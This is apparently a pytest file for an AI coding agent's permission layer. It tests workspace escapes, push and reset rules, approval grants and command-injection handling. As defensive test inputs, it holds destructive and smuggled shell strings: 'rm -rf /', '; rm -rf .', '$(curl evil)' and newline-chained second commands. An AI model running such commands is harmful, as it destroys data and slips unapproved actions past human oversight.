"""Permission/scope guard tests (#201 first slice)."""

from __future__ import annotations

from tests.kernel.test_north_star import (
    FakeCatalog,
    FakeGateway,
    ScriptedStrategy,
    _calc_spec,
)
from xenon.kernel.contracts import (
    Action,
    Budget,
    CallTool,
    Capability,
    Finish,
    ModelView,
    PolicyDecisionKind,
    ReceiptStatus,
    TaskSpec,
    Think,
    ToolIntent,
    ToolReceipt,
)
from xenon.kernel.controller import VerificationController
from xenon.kernel.policies import (
    PermissionMode,
    PermissionPolicy,
    ScopedGrant,
)
from xenon.kernel.runtime import LoopRuntime
from xenon.ledger.events import EventKind
from xenon.ledger.store import Ledger


def _view(workspace: str = ".") -> ModelView:
    spec = TaskSpec(task_id="t1", objective="x", workspace=workspace)
    return ModelView(
        task=spec,
        system="",
        tools=(),
        working_set=(),
        debt=(),
        budget=Budget(),
        input_seq=0,
        hash="h",
    )


def _call(
    capability: Capability, **params: object
) -> Action:
    return CallTool(ToolIntent(capability=capability, params=params))


def _decision(policy: PermissionPolicy, action: Action, workspace: str = "."):
    return policy.check(_view(workspace), action)


def test_read_is_allowed_and_read_only_mode_blocks_edit(tmp_path) -> None:
    read = _decision(PermissionPolicy(), _call(Capability.READ, file_path="a.py"))
    assert read.kind is PolicyDecisionKind.ALLOW

    policy = PermissionPolicy(mode=PermissionMode.READ_ONLY, workspace=str(tmp_path))
    edit = _decision(policy, _call(Capability.EDIT, file_path="a.py"), str(tmp_path))
    assert edit.kind is PolicyDecisionKind.VETO


def test_workspace_edit_is_allowed_but_escape_is_not(tmp_path) -> None:
    policy = PermissionPolicy(workspace=str(tmp_path))
    inside = _decision(
        policy,
        _call(Capability.EDIT, files=[{"path": "calc/add.py", "content": "x"}]),
        str(tmp_path),
    )
    assert inside.kind is PolicyDecisionKind.ALLOW

    outside = _decision(
        policy, _call(Capability.EDIT, file_path="../outside.py"), str(tmp_path)
    )
    assert outside.kind is PolicyDecisionKind.VETO


def test_a_test_command_is_an_execution_not_a_whitelisted_name(tmp_path) -> None:
    """No "safe runner" vocabulary: a verify command goes through approval.

    The closed list (pytest/tox/npm/go/cargo/mvn…) always drifts and let a
    command run with no human answer.  What stays structural is the
    path-only verify call, tested below.
    """

    command = "python -m pytest tests/test_a.py -q"
    default = PermissionPolicy(workspace=str(tmp_path))
    assert (
        _decision(default, _call(Capability.VERIFY, command=command), str(tmp_path)).kind
        is PolicyDecisionKind.VETO
    )

    approving = PermissionPolicy(workspace=str(tmp_path), allow_approval=True)
    assert (
        _decision(
            approving, _call(Capability.VERIFY, command=command), str(tmp_path)
        ).kind
        is PolicyDecisionKind.REQUIRE_APPROVAL
    )

    # A chained destructive command is never merely "approved once": the hard
    # rule runs first, and with no channel it is refused outright.
    injected = _decision(
        default,
        _call(
            Capability.VERIFY,
            command="python -m pytest tests/test_a.py; rm -rf .",
        ),
        str(tmp_path),
    )
    assert injected.kind is PolicyDecisionKind.VETO

    asked = _decision(
        approving,
        _call(
            Capability.VERIFY,
            command="python -m pytest tests/test_a.py; rm -rf .",
        ),
        str(tmp_path),
    )
    assert asked.kind is PolicyDecisionKind.REQUIRE_APPROVAL
    assert "destructive" in asked.reason


def test_verify_single_token_command_is_not_a_path(tmp_path) -> None:
    action = _call(Capability.VERIFY, command="custom-verify")
    default = PermissionPolicy(workspace=str(tmp_path))
    assert _decision(default, action, str(tmp_path)).kind is PolicyDecisionKind.VETO

    approving = PermissionPolicy(workspace=str(tmp_path), allow_approval=True)
    assert (
        _decision(approving, action, str(tmp_path)).kind
        is PolicyDecisionKind.REQUIRE_APPROVAL
    )


def test_structured_test_paths_do_not_authorize_a_command(tmp_path) -> None:
    action = _call(
        Capability.VERIFY,
        command="custom-verify",
        test_paths=[str(tmp_path / "tests" / "test_a.py")],
    )
    default = PermissionPolicy(workspace=str(tmp_path))
    assert _decision(default, action, str(tmp_path)).kind is PolicyDecisionKind.VETO
    approving = PermissionPolicy(workspace=str(tmp_path), allow_approval=True)
    assert (
        _decision(approving, action, str(tmp_path)).kind
        is PolicyDecisionKind.REQUIRE_APPROVAL
    )


def test_structured_test_paths_are_allowed_inside_workspace(tmp_path) -> None:
    policy = PermissionPolicy(workspace=str(tmp_path))
    action = _call(
        Capability.VERIFY,
        test_paths=[str(tmp_path / "tests" / "test_a.py")],
        test_framework="pytest",
    )
    assert _decision(policy, action, str(tmp_path)).kind is PolicyDecisionKind.ALLOW

    escaped = _call(
        Capability.VERIFY,
        test_paths=["../outside/test_a.py"],
    )
    assert (
        _decision(policy, escaped, str(tmp_path)).kind
        is PolicyDecisionKind.VETO
    )


def test_vcs_commit_allowed_but_push_and_reset_are_not(tmp_path) -> None:
    policy = PermissionPolicy(workspace=str(tmp_path))
    commit = _decision(
        policy, _call(Capability.VCS, command="git commit -m fix"), str(tmp_path)
    )
    assert commit.kind is PolicyDecisionKind.ALLOW

    for command in (
        "git push origin main",
        "git reset --hard",
        "git commit -m x; touch pwned",
    ):
        denied = _decision(
            policy, _call(Capability.VCS, command=command), str(tmp_path)
        )
        assert denied.kind is PolicyDecisionKind.VETO, command


def test_remote_requires_a_grant(tmp_path) -> None:
    policy = PermissionPolicy(workspace=str(tmp_path))
    denied = _decision(policy, _call(Capability.REMOTE), str(tmp_path))
    assert denied.kind is PolicyDecisionKind.VETO


def test_scoped_grant_expires(tmp_path) -> None:
    now = [100.0]
    grant = ScopedGrant(
        capability=Capability.VCS,
        target="git fetch",
        expires_at=200.0,
    )
    policy = PermissionPolicy(
        workspace=str(tmp_path), grants=(grant,), clock=lambda: now[0]
    )
    action = _call(Capability.VCS, command="git fetch origin")

    assert _decision(policy, action, str(tmp_path)).kind is PolicyDecisionKind.ALLOW
    now[0] = 200.0
    assert _decision(policy, action, str(tmp_path)).kind is PolicyDecisionKind.VETO


def test_a_grant_cannot_authorize_a_push(tmp_path) -> None:
    """`documents/design` principle: push needs an explicit TaskSpec.allow_push.

    A grant means "stop asking me"; it must not become a way to authorize the one
    action the design keeps out of the approvable set.
    """

    grant = ScopedGrant(capability=Capability.VCS, target="*")
    policy = PermissionPolicy(workspace=str(tmp_path), grants=(grant,))
    action = _call(Capability.VCS, command="git push origin main")

    decision = _decision(policy, action, str(tmp_path))

    assert decision.kind is PolicyDecisionKind.VETO
    assert "push" in decision.reason


class DeniedGateway:
    def execute(self, call, services) -> ToolReceipt:
        return ToolReceipt(
            receipt_id="denied-1",
            call_id="denied-call-1",
            task_id="task-1",
            tool=call.spec_name,
            status=ReceiptStatus.DENIED,
            error="policy denied at gateway",
        )


def test_gateway_denial_writes_receipt_and_policy_event(tmp_path) -> None:
    ledger = Ledger.in_memory("task-1")
    runtime = LoopRuntime(
        catalog=FakeCatalog(),
        gateway=DeniedGateway(),
        controller=VerificationController(),
        ledger=ledger,
    )

    result = runtime.run(
        _calc_spec(),
        ScriptedStrategy(
            [CallTool(ToolIntent(capability=Capability.EDIT)), Think("stop")]
        ),
    )

    # The strategy ends with a Think (no Finish), so the script aborts.
    assert result.accepted is False
    assert ledger.read(EventKind.TOOL_RECEIPT)
    assert any(
        event.kind is EventKind.POLICY_DECISION
        and "policy denied" in str(event.payload.get("reason"))
        for event in ledger.read()
    )


def test_veto_prevents_gateway_execution(tmp_path) -> None:
    ledger = Ledger.in_memory("task-1")
    policy = PermissionPolicy(workspace=str(tmp_path))
    runtime = LoopRuntime(
        catalog=FakeCatalog(),
        gateway=FakeGateway(),
        controller=VerificationController(),
        ledger=ledger,
        policies=(policy,),
    )
    runtime_spec = _calc_spec()
    runtime_spec = type(runtime_spec)(
        task_id=runtime_spec.task_id,
        objective=runtime_spec.objective,
        workspace=str(tmp_path),
    )

    result = runtime.run(
        runtime_spec,
        ScriptedStrategy(
            [_call(Capability.EDIT, file_path="../outside.py"), Think("no")]
        ),
    )

    # A strategy that runs out of actions aborts: that IS an execution stop.
    assert result.accepted is False
    assert result.phase.value == "aborted"
    assert not ledger.read(EventKind.TOOL_RECEIPT)
    assert any(
        event.kind is EventKind.POLICY_DECISION
        and event.payload.get("kind") == "veto"
        for event in ledger.read()
    )
    assert any(
        event.kind is EventKind.CONTROL_DECISION
        and event.payload.get("decision") == "refuse"
        for event in ledger.read()
    )


def test_allow_approval_returns_require_approval_and_grants(tmp_path) -> None:
    policy = PermissionPolicy(
        workspace=str(tmp_path), allow_approval=True, approval_ttl_seconds=30
    )
    shell = _call(Capability.SHELL, command="echo hello")
    decision = _decision(policy, shell, str(tmp_path))
    assert decision.kind is PolicyDecisionKind.REQUIRE_APPROVAL
    assert decision.ttl_seconds == 30
    assert "echo hello" in decision.scope

    grants = policy.approve(decision, shell)
    assert grants
    assert _decision(policy, shell, str(tmp_path)).kind is PolicyDecisionKind.ALLOW
    policy.revoke(grants)
    assert (
        _decision(policy, shell, str(tmp_path)).kind
        is PolicyDecisionKind.REQUIRE_APPROVAL
    )

    destructive = _call(Capability.SHELL, command="rm -rf build")
    # #414: destructive asks too — a human may authorize it, and a remembered
    # grant does not silently cover it.
    assert (
        _decision(policy, destructive, str(tmp_path)).kind
        is PolicyDecisionKind.REQUIRE_APPROVAL
    )
    remote = _call(Capability.REMOTE, server="docs")
    remote_decision = _decision(policy, remote, str(tmp_path))
    assert remote_decision.kind is PolicyDecisionKind.REQUIRE_APPROVAL
    assert policy.approve(remote_decision, remote)


def test_push_asks_for_approval_when_the_turn_has_a_channel(tmp_path) -> None:
    """#414: push used to be vetoed even with a human present.

    Refusing outright meant the person who asked for the push could never
    authorize it — the kernel decided for them.  Now it asks; the veto only
    exists when there is no approval channel to ask through.
    """
    policy = PermissionPolicy(workspace=str(tmp_path), allow_approval=True)
    for command in (
        "git push origin main",
        "git -C repo push origin main",
        "bash -c 'git push origin main'",
    ):
        decision = _decision(
            policy, _call(Capability.SHELL, command=command), str(tmp_path)
        )
        assert decision.kind is PolicyDecisionKind.REQUIRE_APPROVAL, command
        assert "approval" in decision.reason


def test_push_without_a_channel_is_denied_not_silently_run(tmp_path) -> None:
    """No TTY, no approver: fail closed, and say why."""
    policy = PermissionPolicy(workspace=str(tmp_path), allow_approval=False)

    decision = _decision(
        policy,
        _call(Capability.SHELL, command="git push origin main"),
        str(tmp_path),
    )

    assert decision.kind is PolicyDecisionKind.VETO
    assert "human decision" in decision.reason


def test_read_only_allows_remote_only_with_approval(tmp_path) -> None:
    read_only = PermissionPolicy(
        mode=PermissionMode.READ_ONLY,
        workspace=str(tmp_path),
        allow_approval=True,
    )
    remote = _call(Capability.REMOTE, tool_name="github:search")
    assert (
        _decision(read_only, remote, str(tmp_path)).kind
        is PolicyDecisionKind.REQUIRE_APPROVAL
    )
    shell = _call(Capability.SHELL, command="echo hi")
    assert (
        _decision(read_only, shell, str(tmp_path)).kind
        is PolicyDecisionKind.VETO
    )
    without = PermissionPolicy(
        mode=PermissionMode.READ_ONLY, workspace=str(tmp_path)
    )
    assert (
        _decision(without, remote, str(tmp_path)).kind
        is PolicyDecisionKind.VETO
    )


def test_allow_approval_does_not_weaken_read_only(tmp_path) -> None:
    policy = PermissionPolicy(
        mode=PermissionMode.READ_ONLY,
        workspace=str(tmp_path),
        allow_approval=True,
    )
    action = _call(Capability.SHELL, command="echo hello")
    assert (
        _decision(policy, action, str(tmp_path)).kind
        is PolicyDecisionKind.VETO
    )


class Approval:
    def __init__(self, allowed: bool) -> None:
        self.allowed = allowed
        self.calls = []

    def request(self, view, action, decision) -> bool:
        self.calls.append((action, decision))
        return self.allowed


def _approval_runtime(tmp_path, approval):
    ledger = Ledger.in_memory("task-1")
    policy = PermissionPolicy(
        workspace=str(tmp_path),
        allow_approval=True,
    )
    runtime = LoopRuntime(
        catalog=FakeCatalog(),
        gateway=FakeGateway(),
        controller=VerificationController(),
        ledger=ledger,
        policies=(policy,),
        approval=approval,
    )
    spec = TaskSpec(
        task_id="task-1",
        objective="run custom verification",
        workspace=str(tmp_path),
    )
    action = CallTool(
        ToolIntent(
            capability=Capability.VERIFY,
            params={"command": "custom-verify"},
        )
    )
    result = runtime.run(
        spec, ScriptedStrategy([action, Finish("done")])
    )
    return policy, ledger, result


def test_runtime_approval_allows_once_and_revokes_grant(tmp_path) -> None:
    approval = Approval(True)
    policy, ledger, result = _approval_runtime(tmp_path, approval)

    assert approval.calls
    assert ledger.read(EventKind.USER_APPROVAL)
    assert any(
        event.kind is EventKind.POLICY_DECISION
        and event.payload.get("kind") == "require_approval"
        for event in ledger.read()
    )
    assert ledger.read(EventKind.TOOL_RECEIPT)
    assert not policy.grants
    assert result.phase.value in {"finalized", "delivered"}


def test_runtime_approval_denial_does_not_execute_and_the_loop_continues(
    tmp_path,
) -> None:
    """A refusal is about one action, not the whole task (#423).

    The denied call must not reach the gateway; the run must get the chance to
    finish or choose another route instead of dying with an empty answer.
    """

    approval = Approval(False)
    policy, ledger, result = _approval_runtime(tmp_path, approval)

    assert ledger.read(EventKind.USER_APPROVAL)[0].payload["approved"] is False
    assert not ledger.read(EventKind.TOOL_RECEIPT)
    # No receipt means no verified delivery, but the answer is still shown and
    # the gap is disclosed instead of returning an empty blocked screen.
    assert result.answer == "done"
    assert result.accepted is True
    assert result.evidence_status.value in {"partial", "unverified"}
    assert not policy.grants
    assert any(
        event.kind is EventKind.CONTROL_DECISION
        and event.payload.get("decision") == "refuse"
        and event.payload.get("continued")
        for event in ledger.read()
    )


def test_runtime_without_approver_does_not_execute(tmp_path) -> None:
    policy, ledger, result = _approval_runtime(tmp_path, None)

    event = ledger.read(EventKind.USER_APPROVAL)[0]
    assert event.payload["approved"] is False
    assert "no approval provider" in event.payload["reason"]
    assert not ledger.read(EventKind.TOOL_RECEIPT)
    assert result.answer == "done"
    assert result.accepted is True
    assert not policy.grants


class ExplodingApproval:
    def request(self, view, action, decision) -> bool:
        raise RuntimeError("ui crashed")


def test_approval_without_target_fails_closed(tmp_path) -> None:
    ledger = Ledger.in_memory("task-1")
    policy = PermissionPolicy(workspace=str(tmp_path), allow_approval=True)
    runtime = LoopRuntime(
        catalog=FakeCatalog(),
        gateway=FakeGateway(),
        controller=VerificationController(),
        ledger=ledger,
        policies=(policy,),
        approval=Approval(True),
    )
    result = runtime.run(
        _calc_spec(),
        ScriptedStrategy(
            [
                CallTool(ToolIntent(capability=Capability.REMOTE)),
                Finish("done"),
            ]
        ),
    )
    assert result.answer == "done"
    # The refused call never ran; the answer still comes back with a label.
    assert result.accepted is True
    assert not ledger.read(EventKind.TOOL_RECEIPT)
    assert any(
        "could not be scoped" in str(event.payload.get("reason"))
        for event in ledger.read()
    )
    assert not policy.grants


def test_approval_provider_exception_fails_closed(tmp_path) -> None:
    policy, ledger, result = _approval_runtime(
        tmp_path, ExplodingApproval()
    )
    event = ledger.read(EventKind.USER_APPROVAL)[0]
    assert event.payload["approved"] is False
    assert "approval provider failed" in event.payload["reason"]
    assert not ledger.read(EventKind.TOOL_RECEIPT)
    assert result.answer == "done"
    assert result.accepted is True
    assert not policy.grants


def test_read_only_git_queries_need_no_grant() -> None:
    """`git status` is how the model learns what it changed, not a side effect."""

    policy = PermissionPolicy(workspace=".")
    for command in (
        "status",
        "diff",
        "log",
        "show",
        "git status",
        "git diff --stat",
        "branch",
    ):
        decision = _decision(policy, _call(Capability.VCS, git_command=command))
        assert decision.kind is PolicyDecisionKind.ALLOW, command


def test_git_writes_and_chains_still_need_a_grant() -> None:
    policy = PermissionPolicy(workspace=".")
    for command in (
        "commit -m x",
        "push origin main",
        "branch -D old",
        "status && rm -rf build",
        "reset --hard",
    ):
        decision = _decision(policy, _call(Capability.VCS, git_command=command))
        assert decision.kind is not PolicyDecisionKind.ALLOW, command


def test_an_unrecognised_capability_fails_closed() -> None:
    """No branch matches: deny, never fall through to allow.

    The legacy gate had this property for an unknown *risk level*; the kernel
    expresses it for an unknown *capability*, which is the vocabulary it
    actually receives.  Without this test the final ``return self._deny(...)``
    was the one unconditional refusal nobody exercised.

    ``Capability`` is a closed enum, so an unrecognised member cannot be
    constructed.  The reachable case is therefore a value the branches do not
    handle -- ``Capability.GIT``-style families all do, leaving the harness's
    own ``Capability`` set as the surface to check: every member must either be
    allowed, asked or denied, and none may slip through as ALLOW by default.
    """

    from xenon.kernel.contracts import Capability as Cap

    policy = PermissionPolicy(mode=PermissionMode.READ_ONLY, workspace=".")
    for member in Cap:
        decision = _decision(policy, _call(member))
        assert decision.kind is not None, member
        assert decision.kind in (
            PolicyDecisionKind.ALLOW,
            PolicyDecisionKind.REQUIRE_APPROVAL,
            PolicyDecisionKind.VETO,
        ), member

    # A read-only policy must not ALLOW anything that mutates.
    mutating = {
        Cap.EDIT,
        Cap.SHELL,
        Cap.VCS,
        Cap.REMOTE,
        Cap.VERIFY,
    }
    for member in mutating & set(Cap):
        decision = _decision(policy, _call(member))
        assert decision.kind is not PolicyDecisionKind.ALLOW, member


# ── command shape: what "this command" means to a remembered answer ──
#
# Measured on a real task: the model rewrote `python -c "print(123)"` four
# times (`python "-c" …`, a stdin pipe, …), so literal target matching asked
# four times for one intent.  A grant has to follow the program and the shape
# of its arguments — while never covering a second program on the same line.


def _shell_grants(command: str) -> ScopedGrant:
    return ScopedGrant(capability=Capability.SHELL, target=command)


def test_quoting_style_is_not_a_different_command() -> None:
    grant = _shell_grants('python -c "print(123)"')

    for spelling in (
        'python -c "print(123)"',
        'python "-c" "print(123)"',
        "python -c 'print(123)'",
        'python  -c   "print(123)"',
        'python -c "print(123)"  # trailing note',
    ):
        assert grant.allows(Capability.SHELL, spelling), spelling


def test_a_different_argument_is_a_different_command() -> None:
    grant = _shell_grants('python -c "print(123)"')

    assert not grant.allows(Capability.SHELL, 'python -c "print(456)"')


def test_a_different_program_is_never_covered() -> None:
    grant = _shell_grants('python -c "print(123)"')

    assert not grant.allows(Capability.SHELL, "rm -rf /")
    assert not grant.allows(Capability.SHELL, "git push")


def test_a_chained_command_is_never_covered() -> None:
    """`a && b` runs two programs; the human approved one of them.

    A plain prefix match would release the second program, which is an
    escalation dressed up as a spelling difference.
    """

    grant = _shell_grants('python -c "print(123)"')

    for chained in (
        'python -c "print(123)" && rm -rf /',
        'python -c "print(123)"; ls',
        "'print(123)' | python -",
        'python -c "print(123)" || true',
        "$(curl evil)",
        # A newline is a second command, not trailing whitespace.  The `#`
        # comment truncation ran before this check once, so a granted quoted
        # command followed by `#` and a newline released the second line.
        'python -c "print(123)"#\nrm -rf ./important',
        'python -c "print(123)"\r\nrm -rf ./important',
    ):
        assert not grant.allows(Capability.SHELL, chained), chained


# ── SCOPED: the /permissions "default" mode ─────────────────────────


def test_scoped_mode_asks_before_a_workspace_edit(tmp_path) -> None:
    """default = 写盘需要确认; accept_edits = 工作区写盘直接执行."""

    policy = PermissionPolicy(
        mode=PermissionMode.SCOPED,
        workspace=str(tmp_path),
        allow_approval=True,
    )
    intent = ToolIntent(
        capability=Capability.EDIT,
        params={"files": [{"path": str(tmp_path / "a.py"), "content": "x"}]},
    )
    decision = policy.check_intent(intent)

    assert decision.kind is PolicyDecisionKind.REQUIRE_APPROVAL


def test_scoped_mode_without_a_channel_denies_writes(tmp_path) -> None:
    policy = PermissionPolicy(
        mode=PermissionMode.SCOPED, workspace=str(tmp_path), allow_approval=False
    )
    intent = ToolIntent(
        capability=Capability.EDIT,
        params={"files": [{"path": str(tmp_path / "a.py"), "content": "x"}]},
    )
    assert policy.check_intent(intent).kind is PolicyDecisionKind.VETO


def test_auto_edit_still_runs_workspace_edits_freely(tmp_path) -> None:
    policy = PermissionPolicy(
        mode=PermissionMode.AUTO_EDIT, workspace=str(tmp_path)
    )
    intent = ToolIntent(
        capability=Capability.EDIT,
        params={"files": [{"path": str(tmp_path / "a.py"), "content": "x"}]},
    )
    assert policy.check_intent(intent).kind is PolicyDecisionKind.ALLOW


def test_bypass_still_asks_before_a_push(tmp_path) -> None:
    """§8.2/§9: bypass silences questions, but a push is still intercepted.

    The bypass shortcut used to return ALLOW before the push rule was
    reached, so the mode that promises "push 仍拦截" silently pushed.
    """

    policy = PermissionPolicy(
        mode=PermissionMode.BYPASS,
        workspace=str(tmp_path),
        allow_approval=True,
    )

    decision = _decision(
        policy,
        _call(Capability.SHELL, command="git push origin main"),
        str(tmp_path),
    )

    assert decision.kind is PolicyDecisionKind.REQUIRE_APPROVAL


def test_auto_edit_asks_before_running_a_command(tmp_path) -> None:
    """§8.1: auto-edit writes freely but asks before executing a command."""

    policy = PermissionPolicy(
        mode=PermissionMode.AUTO_EDIT,
        workspace=str(tmp_path),
        allow_approval=True,
    )

    decision = _decision(
        policy,
        _call(Capability.SHELL, command="npm run build"),
        str(tmp_path),
    )

    assert decision.kind is PolicyDecisionKind.REQUIRE_APPROVAL
